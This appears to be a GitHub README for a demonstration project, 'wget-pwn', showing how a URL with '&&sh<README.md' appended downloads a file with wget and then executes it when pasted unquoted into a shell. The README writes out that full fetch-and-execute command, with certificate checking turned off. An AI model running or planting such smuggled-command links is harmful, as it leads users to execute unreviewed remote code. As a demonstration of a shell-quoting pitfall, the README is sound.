wget-pwn
=========


A click on the following link in your browser will only display this readme file.


[README.md](https://github.com/markus-perl/wget-pwn/master/README.md&&sh<README.md)


But downloading this link unescaped with wget will execute arbitary code.


    wget --no-check-certificate https://raw.githubusercontent.com/markus-perl/wget-pwn/master/README.md&&sh<README.md
    
    
How it works
------------

The link uses the & char to concat a bash command with the original download link. The & char is a valid char within a link but will be interpreted as a control when used in bash. 
